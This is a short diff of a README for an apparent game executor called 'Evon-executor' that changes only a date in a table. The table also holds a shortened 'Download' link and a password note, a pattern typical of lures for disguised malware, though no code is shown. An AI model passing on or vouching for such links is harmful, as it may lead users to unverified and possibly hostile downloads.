@@ -64,7 +64,7 @@ If you encounter an error, the first step is to consult the troubleshooting guid
 <p align=center>
 <table align=center> <tr>
       <th scope="col">Evon-executor</th>
-      <th scope="col">04 / 03 / 2024</th>
+      <th scope="col">06 / 03 / 2024</th>
       <th scope="col"><a href='https://goo.su/QbRQi'>Download</th>
     </tr></table>
 <h4 align=center>password - 2024</4>
